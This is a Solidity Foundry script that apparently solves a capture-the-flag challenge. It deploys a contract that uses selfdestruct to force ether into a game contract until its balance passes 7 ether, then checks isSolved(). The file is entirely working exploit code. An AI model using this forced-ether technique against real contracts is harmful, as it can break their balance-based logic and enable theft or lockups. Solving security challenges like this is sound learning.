// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import {Script, console} from "forge-std/Script.sol";

contract SevenEthExploit {
    address private immutable target;

    constructor(address _target) {
        target = _target;
    }

    function pwn() external payable {
        selfdestruct(payable(target));
    }
}

contract DeployAndExecuteChallenge4 is Script {
    function run() external {
        string memory privateKeyStr = vm.envString("PRIVATE_KEY");
        bytes memory keyBytes = bytes(privateKeyStr);
        
        string memory hexKey;
        if (keyBytes.length >= 2 && keyBytes[0] == "0" && keyBytes[1] == "x") {
            hexKey = privateKeyStr;
        } else {
            hexKey = string.concat("0x", privateKeyStr);
        }
        
        bytes32 keyBytes32 = vm.parseBytes32(hexKey);
        uint256 deployerPrivateKey = uint256(keyBytes32);
        vm.startBroadcast(deployerPrivateKey);

        address gameAddress = 0xD48939A234e7694535E5A2E2884D5972C0F4E2f7;
        address wrapperAddress = 0xAc18b099b21065207B772947EB7444e35BA7eE6F;
        
        console.log("Game address:", gameAddress);
        console.log("Wrapper address:", wrapperAddress);
        console.log("Game balance before:", address(gameAddress).balance);
        
        SevenEthExploit exploit = new SevenEthExploit(gameAddress);
        console.log("Exploit deployed at:", address(exploit));
        
        uint256 currentBalance = address(gameAddress).balance;
        uint256 requiredAmount = 7 ether + 1 wei - currentBalance;
        console.log("Current game balance:", currentBalance);
        console.log("Required amount to send:", requiredAmount);
        console.log("Sending:", requiredAmount, "wei");
        exploit.pwn{value: requiredAmount}();
        
        console.log("Game balance after:", address(gameAddress).balance);
        
        (bool success, bytes memory data) = wrapperAddress.staticcall(
            abi.encodeWithSignature("isSolved()")
        );
        if (success) {
            bool isSolved = abi.decode(data, (bool));
            console.log("Challenge solved:", isSolved);
        } else {
            console.log("Failed to check if solved");
        }

        vm.stopBroadcast();
    }
}

